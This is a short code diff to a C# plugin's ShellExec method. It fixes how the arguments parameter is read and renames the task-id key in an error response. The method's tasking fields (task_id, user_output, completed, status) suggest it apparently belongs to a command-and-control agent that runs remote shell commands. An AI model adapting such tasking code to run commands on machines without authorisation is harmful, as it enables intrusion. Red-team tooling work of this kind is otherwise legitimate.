@@ -56,7 +56,7 @@ namespace Plugin
         public static ResponseResult ShellExec(Dictionary<string, object> args)
         {
             string parameters = "";
-            if (String.IsNullOrEmpty((string)args["executable"]))
+            if (!String.IsNullOrEmpty((string)args["arguments"]))
             {
                 parameters = (string)args["arguments"];
             }
@@ -110,7 +110,7 @@ namespace Plugin
                 {
                     //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                     user_output = Environment.NewLine + e.ToString(),
-                    task_id = (string)args["task_id"],
+                    task_id = (string)args["task-id"],
                     completed = "true",
                     status = "error"
                 };
